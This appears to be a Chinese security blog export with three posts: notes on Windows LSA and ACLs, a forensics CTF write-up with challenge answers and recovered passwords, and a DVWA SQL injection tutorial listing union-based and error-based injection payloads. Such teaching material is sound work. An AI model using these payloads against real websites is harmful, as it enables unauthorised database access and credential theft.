LSA是所有用户登录请求的最终处理者\n无论是本地登录还是通过网络的域登录，凭证信息最终都会被传递给LSA进行验证\n访问令牌生成 在用户身份验证成功后，LSA负责创建该用户的访问令牌 (_TOKEN结构)\n该令牌是一个内核对象，它详细描述了用户的安全上下文，包括用户SID、所属组的SID列表、特权列表以及会话信息\n安全策略管理 LSA强制执行在本地安全策略 (secpol.msc) 中定义的规则\n例如密码复杂度策略、账户锁定策略以及用户权限分配\n凭证缓存与管理 为了支持网络认证（如NTLM）和单点登录（SSO），lsass.exe进程的内存中会缓存多种形式的凭证数据\n包括 NTLM 哈希、Kerberos 票据，以及在某些配置下（如开启WDigest认证）的可逆加密或明文形式的密码\n安全审计 根据系统中配置的审计策略，LSA会生成安全事件日志（如登录成功/失败、对象访问等）\n它会将这些日志发送给事件日志服务（Event Log service）进行记录\nLSA认证流程 以一个典型的本地交互式登录为例，LSA 在其中的工作流程如下：\n用户在登录界面（由winlogon.exe管理）输入用户名和密码\nwinlogon.exe 将这些凭证安全地传递给lsass.exe进程\nlsass.exe接收到凭证后，调用相应的认证包，对于本地登录，通常是msv1_0.dll\nmsv1_0.dll与安全帐户管理器(Security Account Manager, SAM)服务通信，请求验证密码\nSAM服务会比对提交的密码哈希与存储在SAM注册表配置单元中的哈希是否一致\n验证成功后，LSA会创建一个包含该用户所有安全信息的访问令牌\nLSA 将此令牌返回给winlogon.exe，winlogon.exe再使用该令牌来启动用户的初始进程（userinit.exe），进而创建桌面环境（explorer.exe）\nLSA的Protection机制 由于lsass.exe内存的敏感性，微软在Windows8.1/Server2012R2及之后版本中引入了LSA Protection机制，其技术名称为受保护的进程之光 (Protected Process Light, PPL)什么鬼名字\n通过在注册表中设置一个特定的键值：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa下的RunAsPPL，让lsass.exe进程可以在启动时被标记为一个受保护的进程\nWindows 内核的内存管理器会阻止任何非受保护的进程（即使是拥有管理员权限的进程）打开lsass.exe 的句柄并请求读取其内存或注入代码\n只有拥有微软特定签名的、同样是受保护的进程（如杀毒软件）才能对其进行访问\n此保护机制仅对活动的操作系统有效，对于通过物理采集或虚拟机快照获得的离线内存镜像进行分析时LSA Protection无效，仍然可以使用Volatility等工具解析lsass.exe的内存\n授权机制 在Windows安全机制中，ACL（Access Control List，访问控制列表） 和 ACE（Access Control Entry，访问控制条目） 是实现授权控制的基础结构，用于定义和限制安全主体对系统对象的访问权限\n访问控制列表 —— ACL ACL 是附加在受保护对象（如文件、进程、注册表键、线程等）上的权限集合，用于控制哪些用户或组能够对该对象执行哪些操作\nACL 分为两种类型：\nDACL 全称Discretionary ACL，自由访问控制列表\n用于指定允许或拒绝某个主体访问对象的权限，是授权控制的核心部分\nSACL 全称System ACL，系统访问控制列表\n用于指定系统是否应审计某个主体对对象的访问（例如记录成功或失败的访问尝试），用于安全审计\n访问控制条目 —— ACE ACL 由一个或多个 ACE 组成，每条 ACE 定义一个安全主体对对象的某种访问规则。ACE 是描述“谁能做什么”的最小授权单元。\n主要组成字段 字段 描述 SID（Security Identifier） 指定该条权限适用的安全主体（用户或用户组） Type（类型） 标识是“允许访问”还是“拒绝访问” Access Mask（访问掩码） 描述具体的权限（如读取、写入、执行、删除等） Flags（标志） 控制是否可继承、是否用于审计等附加属性 常见类型 ACE 类型 描述 ACCESS_ALLOWED_ACE_TYPE 允许某个 SID 执行指定操作 ACCESS_DENIED_ACE_TYPE 拒绝某个 SID 执行指定操作 SYSTEM_AUDIT_ACE_TYPE 审计某个 SID 的访问行为（记录日志） ACE 匹配与权限判断流程 当一个用户（或进程）尝试访问某个对象时，系统会进行如下判断流程：\n获取该用户的访问令牌（包含 SID 和所属组列表） 读取目标对象的 DACL，依序遍历其中的 ACE 将访问令牌中的 SID 与每条 ACE 的 SID 进行比对 遇到匹配的 Deny 类型 ACE → 立即拒绝访问 遇到匹配的 Allow 类型 ACE → 记录允许的操作权限 继续匹配，直到所有 ACE 遍历完成或提前拒绝 如果请求的权限未被任何 ACE 显式允许 → 拒绝访问 注意：ACE 在 DACL 中的顺序非常重要，Deny ACE 一般优先于 Allow ACE\n继承机制与显式权限 ACE 还可以具有继承性：\n显式ACE：直接定义在对象上的权限 继承ACE：从上层容器（如文件夹）继承而来，可自动应用到子对象 继承标志包括： OBJECT_INHERIT_ACE：继承给子对象 CONTAINER_INHERIT_ACE：继承给子容器 INHERIT_ONLY_ACE：仅供继承使用，不适用于当前对象； NO_PROPAGATE_INHERIT_ACE：仅继承一级，不再向下传递 这些继承规则支持管理员一次性配置整个目录或注册表项的权限，提升安全管理效率\n权限掩码常见值 权限 描述 READ 读取对象数据（如文件内容、注册表值） WRITE 修改对象数据 EXECUTE 执行对象 DELETE 删除对象 READ_CONTROL 读取对象的安全描述符（但不包含 DACL） WRITE_DAC 修改对象的 DACL WRITE_OWNER 修改对象的所有者 FULL_CONTROL 拥有全部权限（等价于管理员完全控制） 对象安全描述符 对象的安全信息不仅包括ACL，还包括以下结构，一起被称为安全描述符：\n字段 含义 所有者 对象的拥有者，默认有修改权限 主组 通常在POSIX/UNIX环境兼容性使用 DACL 授权控制 SACL 审计控制 通过GetSecurityInfo、SetSecurityInfo等 API，可以查询或修改对象的安全描述符\n","date":"2025-07-21T12:17:22+08:00","image":"http://picture.928330.xyz/typora/4e5de5bb8148393ec0630865e61fb90f.jpg","permalink":"https://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8A/","title":"windows相关知识总结（上）"},{"content":"第一次做题，写的比较细比较繁琐\n火眼证据分析 火眼证据分析中新建案件，选择镜像文件检材一，打开就会自动创建分析任务进行分析：\n也可以点击快速分析，选择任务进行分析： 检材1(计算机磁盘镜像) 1.检材一硬盘的 MD5 值为多少 计算哈希，选择md5\n计算过程需要对加密卷解密（文件 -\u0026gt; 右键加密分区 -\u0026gt; 解密），因此最好先把下一问做完再进行计算：\n80518BC0DBF3315F806E9EDF7EE13C12 2.检材一 BitLocker 的恢复密钥是多少 使用EFDD，配合检材三给出的的内存镜像爆破：\n585805-292292-462539-352495-691284-509212-527219-095942 3.检材一镜像中用户最近一次打开的文件名是什么 依次点击：分析 -\u0026gt; 经典视图 -\u0026gt; 查看最后访问时间\n最后一个文件名称为：\n列表.xlsx 4.检材一硬盘系统分区的起始位置 查看系统分区：\n分区4是引导加载程序位置，之后的分区六应该才是主系统分区（硬盘分区），起始位置为：\n649216 5.检材一系统的版本号是多少(格式:x.x.x.x) 分析 -\u0026gt; 基本信息 -\u0026gt; 系统信息：\n这里有两个版本号，组合在一起才是题目要求的格式\n在win10和win11中，第二位数字（次要版本号）固定为0：\n10.0.19042.508 6.检材一回收站中的文件被删除前的路径 分析 -\u0026gt; 基本信息 -\u0026gt; 回收站记录：\nC:/Users/rd/Desktop/iTunes(12.13.0.9).exe 7.检材一给出最后一次修改系统时间前的时间(格式: YYYY-MM-DD HH:MM:SS) 分析 -\u0026gt; 基本信息 -\u0026gt; 系统时间变更 -\u0026gt; 时间变更记录：\n比对各个更改时间的记录的操作时间，找出最晚操作的时间的原系统时间：\n2023-12-12 16:37:12 8.检材一最后一次远程连接本机的时间(格式: YYYY-MM-DD HH:MM:SS） 分析 -\u0026gt; 远程桌面 -\u0026gt; 远程连接过本机的记录：\n查看连接成功记录，比对最晚的连接时间：\n2023-12-11 15:57:02 9.检材一 Chrome 浏览器最后一次搜索过的关键词是什么 分析 -\u0026gt; Chrome浏览器 -\u0026gt; 历史记录 -\u0026gt; 最后访问时间 ：\n从url里面看出搜索内容：\n常见的诈骗话术2023 10.检材一是否连接过 U 盘,如有,请给出 U 盘的 SN 码 分析 -\u0026gt; 基本信息 -\u0026gt; USB最近使用记录 -\u0026gt; 操作时间：\n查看接入过的最后一个设备：\nFC2005927F271 11.检材一 Edge 浏览器最早一次下载过的文件文件名是 分析 -\u0026gt; Edge浏览器 -\u0026gt; 下载记录 -\u0026gt; 结束时间倒序：\n第一个i4tools8不知道为什么没有时间，但详细条目显示时间晚于winrar：\nwinrar-x64-624scp.exe 12.嫌疑人访问的微博的密码的 MD5 值 分析 -\u0026gt; Chrome浏览器 -\u0026gt; 保存的密码：\n微博密码是!dfrDj*\u0026amp;j98_jUe8，计算MD5值：\n5cb42860b3b61ef6dd361ad556f48e05 检材二(iPhone 备份数据) 13.检材二备份的设备名称是什么 分析 -\u0026gt; 基本信息 -\u0026gt; 设备信息：\n\u0026#34;User\u0026#34;的iPhone 14.检材二手机的 iOS 系统版本是多少 同13题图\n17.0 15.检材二备份的时间是多少?(格式: YYYY-MM-DD HH:MM:SS) 同13题图\n2023-12-09 15:02:28 16嫌疑人 iPhone 手机给号码\u0026quot;13502409024\u0026quot;最后一次打电话的时间是(格式: YYYY-MM-DD HH:MM:SS) 当前的备份文件中没有通话记录，其实这个藏在检材一中\n分析 -\u0026gt; 嵌套证据识别 -\u0026gt; IOS备份：\n给出了一个info.plist文件的地址，但他只是配置文件，我们需要回到上层目录，导出完整备份文件：\n同时，我们也能把它添加为新检材，扫描过程中会发现这是加密后的文件，需要密码\n使用Passware Kit Forensic爆破，这里需要爆破的文件是Manifest.plist，从后文（22题）知道是五位数密码\n选择Customize Settings高级设置：\n只保留brute-force，修改成五位数字：\n爆破：\n输入密码后继续分析，分析完成后刷新一下，就会多出新的检材分析结果了\n分析 -\u0026gt; 基本信息 -\u0026gt; 通话记录 -\u0026gt; 时间：\n2023-12-04 13:18:50 17.检材二使用过的号码 ICCID 是多少 同13题图\n89860000191997734908 18.检材二手机中高德地图最后搜索的地址 分析 -\u0026gt; 高德地图 -\u0026gt; 搜索点：\n双山大道3号 19.检材二手机最后一次登陆/注册\u0026quot;HotsCoin\u0026quot;的时间是(格式: YYYY-MM-DDHH:MM:SS) HotsCoin是数字交易平台，从短信中能得到登录时间\n分析 -\u0026gt; 基本信息 -\u0026gt; 短信：\n2023-12-04 13:28:14 20.检材二手机中照片\u0026quot;IMG_0002\u0026quot;的拍摄时间是(格式: YYYY-MM-DD HH:MM:SS) 分析 -\u0026gt; 基本信息 -\u0026gt; 图片 -\u0026gt; IMG_0002：\n2023-12-06 11:08:30 21.检材二中\u0026quot;小西米语音\u0026quot; app 的Bundle ID是什么 Bundle ID是iOS应用唯一标识符，也就是包名\n分析 -\u0026gt; 基本信息 -\u0026gt; 应用列表 -\u0026gt; 搜索小西米语音：\ncom.titashow.tangliao 22.检材二中浏览器最后一次搜索的关键词是什么 浏览器不是uc浏览器，指的是safari\n分析 -\u0026gt; Safari -\u0026gt; 搜索历史：\nios备份密码忘了怎么办 五位纯数字 这里也就是在提示前面的加密备份文件的密码\n23.嫌疑人和洗钱人员约定电子钱包的品牌是什么, 如有多个用顿号分隔 微信聊天记录和信息里都没有相关信息，其他应用里面只有小西米语音有可能了\n分析 -\u0026gt; 其他应用 -\u0026gt; 小西米语音 -\u0026gt; 在线连麦平台 -\u0026gt; 文件分类 -\u0026gt; SQLite 文件\n其他应用是耗时分析，火眼不会自动分析，需要手动进行选择分析\n本来应该是有im5db这个数据库的，我的分析结果里面没有，其他六个都有，也许是因为后缀的原因？\n所以直接沿着下面这个路径找了：\n/Documents/IM5_CN/9031bc3c805ac5e55ecaa151092c2c4b/IM5_storage/1399634813467579522/im5db\n查看message表的content字段：\nimToken、Bitcoin 24.嫌疑人和洗钱人员约定电子钱包的金额比例是什么 同上题图：\n0.2 检材三(计算机内存镜像) 25.检材三中进程\u0026quot;FTK Imager.exe\u0026quot;的 PID 是多少 不知道为什么我的volatility2不能分析出win10的结果，只好使用volatility3：\npython3 vol.py -f ../memdump2023.raw windows.pslist.PsList | grep FTK 11328 26.检材三中显示的系统时间是多少?(格式: YYYY-MM-DD HH:MM:SS) python3 vol.py -f ../memdump2023.raw windows.info.Info 2023-12-12 04:06:25 27.检材三中记录的当前系统ip是多少? python3 vol.py -f ../memdump2023.raw windows.netscan.NetScan 172.18.7.229 检材四 (红米手机备份数据) 28.检材四中迅雷下载过的文件名是什么? 分析 -\u0026gt; 迅雷 -\u0026gt; 云盘 -\u0026gt; 离线下载目录：\n《向银河靠近》.txt 29.检材四中安装了哪些可是实现翻墙(VPN)功能的 app? 没啥说的： clash 30.检材四备份的设备系统版本是多少? 分析 -\u0026gt; 基本信息-\u0026gt; 设备信息 -\u0026gt; 厂商版本：\nV14.0.2.0.TKSCNXM 31.检材四备份的时间是多少(答案以 13 位时间戳表示) 同上题图，转换时间戳（2023-12-13 17:20:32）：\n1702459232429 32.检材四中 FileCompress app 包名是什么? 包名就在检材里面列出，复制黏贴就行：\ncom.zs.filecompress 33.检材四中备忘录记录的内容是什么? 分析 -\u0026gt; 基本信息-\u0026gt; 便签：\nVcpswd:edgewallet 34.请列出检材四中所有虚拟币钱包 app 的包名, 如有多个用顿号分隔 直接搜索检材里的app，一共六个： de.schildbach.wallet、com.bitcoin.mwallet、 piuk.blockchain.android、im.token.app、com.paxful.wallet、pro.huobi 35.检材四中嫌疑人使用 Bitcoin Wallet 钱包地址是什么? 在下面路径中找到并导出日志文件：\nBitcoin Wallet(de.schildbach.wallet).bak/apps/de.schildbach.wallet/f/log/wallet.log 搜索walletaddress：\nbc1q4ru3a8r0vzymwwcmawvtdyf6hkvt2x9477hjkt 36.MD5 值为\u0026quot;FF3DABD0A610230C2486BFFBE15E5DFF\u0026quot;的文件在检材四中的位置 这一题据说是结合前面提到的FileCompress一路找下去就能发现，不过太电波了：\n这里更好的办法是用HashMyFiles，全部算一遍再搜索\n然而我不知道怎么使用这个工具，好在火眼有类似的功能\n文件 -\u0026gt; 检材四 -\u0026gt; 文件系统 -\u0026gt; 勾选所有文件 -\u0026gt; 右键新建哈希集 -\u0026gt; 勾选项：\n创建的新建哈希集任务完成后，选择高级，在文件哈希处输入MD5，过滤范围选择子目录：\n成功找到目标文件：\n20231213_172032.tar/FileCompress(com.zs.filecompress).bak/FileCompress/11月.txt 综合题目 37.检材中受害人的微信号是多少? 检材二 -\u0026gt; 微信 -\u0026gt; 好友消息，根据聊天记录能判断出受害者就是小浩：\nB-I-N-A-R-Y 38.嫌疑人曾通过微信购买过一个公民信息数据库, 该数据库中手机尾号是 8686 的用户的姓名是 从另一个微信好友里面能发现购买数据库的名称为database.sqlite： 这个数据库手机看不了，在电脑里能看：\n链接数据库后查找：\nSELECT name FROM users WHERE phone LIKE \u0026#39;%8686\u0026#39;; 章敏 39.嫌疑人手机中是否保存了小西米语音 app 的账号密码, 如有, 请写出其密码 加密iOS备份 -\u0026gt; 钥匙串 -\u0026gt; 网站与应用密码，我们已经知道小西米的包名com.titashow.tangliao：\njamvU1@wiwgug$bo 40.公民信息数据库中, 截止到 2023 年 12 月 31 日, 年龄大于等于 18 且小于等于 30 岁之间的用户信息数量 在38题中得到的database数据库里进行查询：\nselect count(*) from users where (\u0026#39;20231231\u0026#39; - substr(IDCARD, 7, 8)) between 180000 and 300000; 得到结果：\n1572 41.受害人小浩的手机号码是多少 在上面的数据库中没有找到叫小浩的人，微信和短信也没有小浩的联系方式\n结果是之前找到的11月.txt是受害者名单，怎么发现的呢？\n案件 -\u0026gt; 快速分析 -\u0026gt; 耗时任务 -\u0026gt; 特征分析：\n分析任务完成后，在文件 -\u0026gt; 检材 -\u0026gt; 加密文件中找到TrueCrypt容器\n在检材1的20231212.E01/分区6/Users/rd/Documents下有一个新建文本文档.txt是加密容器，有88MB：\n之前备忘录发现的内容Vcpswd:edgewallet，在检材一edge密码中找到对应内容：\n从字面猜测这个密码应该就是vc加密的密码pR7)nZ5\u0026amp;yQ2-oR0\u0026lt;，而加密卷应该就是那个很大的txt文件\n挂载：\n发现里面存在9月和10月两个名单： 九月是未加密的txt文件，十月却不是txt文件，而是一个pk开头的压缩包，应该是和11月一样的加密方式\n压缩包密码藏在了FileCompress软件中，找出软件安装包（apk）：\nFileCompress(com.zs.filecompress).bak/apps/com.zs.filecompress/a 导出后，使用jadx逆向：\ncom下找到主函数，代码逻辑中得到密码1!8Da9Re5it2b3a.，解密10月和11月：\n小浩的手机号：\n13533333333 42.完整的受害人名单是几个人 上题得知，一共6人\n43.受害人转账的总金额是多少 检材二中有一次付款，加密备份中有两次付款，每次都是200，通过上下文语境能知道三次付款没有重叠\n600 ","date":"2025-07-09T21:17:30+08:00","image":"http://picture.928330.xyz/typora/t010423dafdaa0e3353.jpg","permalink":"https://blog.928330.xyz/p/%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AF2023%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/","title":"中科实数杯2023取证总结"},{"content":"SQL注入是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而得到相应的数据信息\n我们可以选择手工注入，也能够选择使用自动化工具sqlmap进行注入\n手工注入 #0 环境配置 使用靶机：DVWA mysql\n将DVWA的security级别设置为low，可以看到php源码中是一句简单的查询语句，没有进行任何过过滤\n当用户输入查询内容的时候，$id将会被替换成此内容：\n$query = \u0026#34;SELECT first_name, last_name FROM users WHERE user_id = \u0026#39;$id\u0026#39;; 比如，我们输入1，那么执行的语句就是\nSELECT first_name, last_name FROM users WHERE user_id = \u0026#39;1\u0026#39; 那如果我们输入1\u0026rsquo; and 1=1#:\nSELECT first_name, last_name FROM users WHERE user_id = \u0026#39;1\u0026#39; and 1=1# \u0026#39; 可以看到，前面的\u0026rsquo;\u0026lsquo;闭合了，后面的\u0026rsquo;被我们注释了，中间的and1=1会被正常执行\n那么我们完全可以在这里面插入自己想要执行的sql语句，这就是SQL注入！\n#1 union联合查询注入 虽然知道可以执行任意sql代码了，但是我们又不知道有哪些表，表里面有哪些元素，有什么用呢？\n所以，现在我们需要通过一系列的操作，来确定这些东西：\n1.判断是否存在注入，注入是字符型还是数字型\n2.猜测SQL查询语句中的字段数\n3.确定显示的字段顺序\n4.获取当前数据库\n5.获取数据库中的表\n6.获取表中的字段名\n7.显示字段信息\n那么，开始吧！\n常用函数 功能类别 函数/语句 主要数据库 功能描述 注入示例 系统信息查询 database() 或 schema() MySQL 获取当前数据库的名称 ' union select 1,database() # version() 或@@version 通用 获取数据库的详细版本号 ' union select 1,version() # user() 或 current_user() 通用 获取执行查询的数据库用户名 ' union select 1,user() # @@hostname MySQL, MSSQL 获取数据库服务器的主机名 ' union select 1,@@hostname # @@datadir MySQL 获取数据库文件的存储路径 ' union select 1,@@datadir # 数据查询与拼接 group_concat() MySQL, SQLite 纵向将多行结果合并成一个字符串一行显示，用于一次性列出所有表名/列名 ' union select 1,group_concat(table_name) from information_schema.tables # concat() 或 concat_ws() MySQL **横向将多个字符串或列连接成一个，但是不改变行数，**用于拼接用户名和密码等字段 ' union select 1,concat(username,':',password) from users # count() 通用 统计行数 ' union select 1,count(*) from users # substring() 或 limit 通用 截取字符串或按行返回。主要用于盲注，逐个字符或逐行猜解数据 ' and substring(database(),1,1)='a' # 1.判断注入是字符类型or数字型 为什么需要判断？因为数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合\n**数字型：**select * from table where id =$id，我们可以直接输入1 and ... 进行执行:\nselect * from table where id =1 and ... **字符型：**select * from table where id=\u0026rsquo;$id\u0026rsquo;我们需要输入1' and ... # ，闭合前后单引号\nselect * from table where id=\u0026#39;1\u0026#39; and ... #\u0026#39; 💡 Tip \u0026ndash; 是官方的注释，后面必须跟空格\n# 是mysql特有的注释，后面无需跟空格\n如果直接在url中注入而非输入框，需要使用%23代替#，因为浏览器会把#后面内容截断，而非编码\n有的网站会过滤空格导致\u0026ndash;报错，这时候可以使用\u0026ndash;+，用+代替空格\n以上方法不一定全部适用，需要结合实际情况尝试\n基于这种思路，只要我们能够测试注入成功，使得页面不出现语法报错，那么就可以借此判断出类型：\n测试目的 测试Payload 预期结果 判断数字型 1 and 1=1 页面 正常，与 ?id=1 时相同 1 and 1=2 页面 内容异常 (如变空)，但不是程序或语法报错 判断字符型 1' and '1'='1 页面 正常，与 ?id='1' 时相同 1' and '1'='2 页面 内容异常 (如变空)，但不是程序或语法报错 分别测试是否对应的结果\n📝 Note 还有更加简单（但是不知道是否一定有效的方法）：\n输入2-1，如果是数字型，就会执行2-1运算，id=1；如果是字符型，就会是id=2\n可以构造一个m-n，m是不存在的id，但m-n结果是存在的id，依据结果来判断是字符型还是数字型\n这一点在盲注时比较方便\n通过以上测试，我们知道了现在DVWA的注入类型是字符型\n当然，在写题的时候很有可能你一个也试不出来，因为它是被('')或者\u0026quot;\u0026quot;包裹的，这就需要你凭感觉试了\n不过在此之前，先检查一下你之前的语句有没有写对吧~\n2.猜测SQL查询语句中的字段数（列数） 从1开始，使用order by语句指定查询结果依照第n列排序，如果报错，说明不存在该行列\n1\u0026#39; or 1=1 order by 1 # 1\u0026#39; or 1=1 order by 2 # 1\u0026#39; or 1=1 order by 3 # //报错了 order by 3的时候报错，说明当前查询的表中只有2列\n💡 Tip and：如果and前为真，执行后面内容\nor：如果前面为假，才执行后面内容\n3.确定显示的字段顺序 虽然我们知道了字段数，但很可能这些字段不是都显示在网页前端的\n假如其中某些字段的查询结果是会返回到前端的，那么我们就需要知道这些字段中哪些结果会回显，如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试\n这时候我们利用一个简单的语句：select 1,2,3，根据显示在页面上的数字就可以知道回显位置（sql特性）\n之后，我们只需要把这个数字改成我们想查询的内容（如id,password），就会在窗口显示我们想要的结果\n1\u0026#39; union select 1,2 # 这样就确定了网站执行的SQL语句为：\nselect Firstname,Surname from xx where ID=\u0026#39;id\u0026#39; 从过程中也不难看出，其实确定字段列数和显示顺序可以一起做 从union select 1开始，一直增加select后的位数，直到报错为止\n4.获取当前数据库 知道了回显位，我们就可以把回显位替换成想要的数据\n这里一定要写全，有多少字段，select后面就要有多少相应的字段：\n1\u0026#39; union select 1,database() # database() 是mysql内置函数，当数据库执行到它时，会将其替换为当前正在使用的数据库的名称\n于是，我们就知道了当前数据库名称为dvwa\n5.获取数据库中的表 information_schema.tables表存储了数据表的元数据信息：\n字段名 (Field Name) 描述 (Description) table_schema 记录该表所在的数据库的名称 table_name 记录数据表的名称 engine 记录该表使用的存储引擎，例如 InnoDB, MyISAM table_rows 关于表中总行数的一个粗略估计值 data_length 记录数据表本身的大小（单位：字节） index_length 记录数据表索引的大小（单位：字节） row_format 记录行的格式，例如 Dynamic 或 Compressed，可用于判断表是否被压缩 我们就可以从中得到想要的信息：\n1\u0026#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 上面的语句效果等同于下面的语句，只不过使用了group_concat()，让输出的内容拼成了一个字符串：\n1\u0026#39; union select 1,table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; # 这样就知道了dvwa里面一共有两个表，分别为guestbook和users\n6.获取表中的字段名 information_schema.columns表存储了所有表所有列的元数据信息：\n字段名 描述 COLUMN_NAME 记录列的名称 TABLE_NAME 记录该列所属的数据表的名称 TABLE_SCHEMA 记录该列所属的数据库的名称 ORDINAL_POSITION 记录该列在表中的位置顺序（一个从1开始的数字） DATA_TYPE 记录该列的数据类型，例如 varchar, int, text 等 COLUMN_KEY 记录该列是否为键（索引）。PRI 代表主键, UNI 代表唯一键, MUL 代表可重复的索引 COLUMN_DEFAULT 记录该列的默认值（如果设置了） IS_NULLABLE 记录该列是否允许为 NULL 值 (YES 或 NO)。 CHARACTER_MAXIMUM_LENGTH 记录字符串类型列的最大长度。 同样借此获取users表的字段：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; and table_schema=database()# 这样就得到了users表的所有的列名称\n这里要注意的是，除了指定表名之外，还要指定数据库名，否则就会出现很多不属于这个表的列名：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; # 7.获取字段信息 知道了表名和列名，就能轻松获取对应信息了\n比如我想获取所有用户的id名称和对应密码：\n1\u0026#39; union select group_concat(user_id,first_name),group_concat(password) from users # 我们在这里使用group_concat拼接了两组字符串，因为select输出的数量必须与字段数一致，这里是2\n8.逐行获取信息 书接上文，如果我只想要显示某一条信息，就可以在末尾加上limit m,n\n意思是从第m条数据开始，显示包括n条数据，比如limit 0,1，就是只显示第1条数据（数据从0开始存储）\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 1,1 # 这里使用limit1,1，就只显示了第二条数据\n#2 报错注入 如果union被过滤，或者页面没有回显但SQL语句执行可以输出错误信息，就可以使用基于报错的注入攻击\n报错注入就是人为制造错误条件，让查询结果在报错信息中被“带出”\n报错注入最好使用and，因为我们的目的是保证语句执行错误，产生错误信息\n常用函数 在mysql高版本**（大于5.1版本）**中添加了对XML文档进行查询和修改的函数updatexml()和extractvalue()\n当这两个函数在执行时，如果出现xml文档路径错误就会产生报错\nextractvalue (XML_document, XPath_string) 第一个参数：XML_document 是目标XML文档\n第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容\n我们可以利用concat拼接任意非法字符和查询语句/函数，这样想要得到的内容就会随着报错一并回显：\n1\u0026#39; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))# 0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误：\nXPATH syntax error: \u0026#39;~dvwa~\u0026#39; 我们使用了database()函数，而sql会执行这个函数，返回函数结果，就带出了数据库名称\nupdatexml (XML_document, XPath_string, new_value) 第一个参数：XML_document 是目标XML文档 第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容 第三个参数：new_value 用来替换查找到的符合条件的数据 1\u0026#39; and updatexml(1,concat(0x7e,(select database()),0x7e),3)# 也是同理会报错\n之后的演示我会以updatexml()和extractvalue()为主\n但在此之前，我还想介绍一些其他的好玩的函数(当然也很有用!）👇\n不那么常用的函数 floor函数(8.x\u0026gt;mysql\u0026gt;5.0） floor()：对结果取整（向下舍入）\n这不是一个单独使用的函数，而是需要与rand(), count(*)和group by结合使用，来触发主键重复错误：\n(select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a) ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑ 这里插入你想进行的查询语句，只能有一个返回值，因为concat函数值只接受单值，最好使用limit语句，比如： (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 现在，我们输入这样的注入语句：\n1\u0026#39; and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)# 我们看看每一个部分的作用：\nfloor(rand(0)\\*2)\nrand()函数会产生一个0到1之间的随机数。但当给它一个固定的种子（seed），如0时，它产生的“随机数”序列就变成完全可预测的了\n最终，floor(rand(0)*2)会稳定地产生这样一个序列：0, 1, 1, 0, 1, 1, 0, ...\nconcat((select database()), floor(rand(0)\\*2))\n这部分将我们要查询的数据与上面产生的0或1拼接起来\n因此，它会生成一系列的字符串，如 'dvwa0', 'dvwa1', 'dvwa1', 'dvwa0'\n... from information_schema.tables group by x\nfrom information_schema.tables：这里只是为了提供足够的数据行（至少3行）来让group by操作得以触发错误，任何行数足够的表都可以。\ngroup by x：这是触发错误的关键，它会根据我们上面生成的字符串（如'dvwa0', 'dvwa1'）进行分组和计数。\nselect 1 from ...\n把返回两列的内部查询包装成只返回一列（内容是1）的、语法正确的子查询\n接下来，我们需要知道两个关键点：\n1.group by在执行时，会建立一个虚拟的临时表，用于存放分组的键(key)和count(*)计数值\n2.在执行插入操作前，sql会再次查询当前要插入的键，因此rand()会再次执行\n现在来看看错误是怎样发生的：\n逐行处理：\n第一行：调用rand()，计算出的键是'dvwa0'，临时表中没有这个键，sql准备插入，此时第二次调用rand()，计算出'dvwa1'插入\n（也就是说，想插入的是0，却插入了1）\n第二行：此时rand()第三次被调用，计算出的键是'dvwa1'，临时表中已经有了，不用插入，计数值加一就行\n（注意：sql这里一开始就没有打算插入，而是选择count+1）\n触发错误：\n第三行：此时rand()第四次被调用，计算出的键是'dvwa0'，表里没有这个键，所以sql准备插入，此时第五次调用rand()，计算出'dvwa1'插入\n等等，不对！表里已经有'dvwa1'了！\n这就导致sql尝试插入一个已经存在的键，从而触发了**“主键重复”（Duplicate entry）的错误：**\nDuplicate entry \u0026#39;dvwa1\u0026#39; for key \u0026#39;group_key\u0026#39; 这样，就把数据库名称带了出来\n同时，我们还能总结出这样的规律：\n对于一个整数x通过floor(rand(x)*2)产生的序列：\n如果在未出现0011或1100序列前出现0010或1101，那么该序列可用于报错型sql盲注\n参考文档：SQL报错型盲注教程 ​\t关于floor()报错注入，你真的懂了吗？ ST_LatFromGeoHash(geohash_string) 参数是一个GeoHash格式的字符串，如果格式不对，函数就会报错，并可能返回导致错误的非法字符串\n1\u0026#39; and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))# 和XPath_string一样，~不是GeoHash格式里面的合法字符，如果使用就会报错，同时带出数据：\nFUNCTION dvwa.ST_LatFromGeoHash does not exist ↑↑↑↑↑ ST_LongFromGeoHash(geohash_string) 利用原理与ST_LatFromGeoHash完全相同\nST_PointFromGeoHash(geohash_string, srid) 好吧和上面还是一样的\nGTID_SUBSET(subset, set) 第一个参数： subset一个GTID（全局事务标识符）集合。\n第二个参数： set另一个GTID集合。\n一个合法的GTID单元由两部分组成，用冒号隔开：source_id:transaction_id\n当任意一个参数不是合法的GTID集合格式时，函数就会报错，并可能返回非法参数的内容\n1\u0026#39; and GTID_SUBSET(database(), 1)# 报错结果：\nFUNCTION dvwa.GTID_SUBSET does not exist 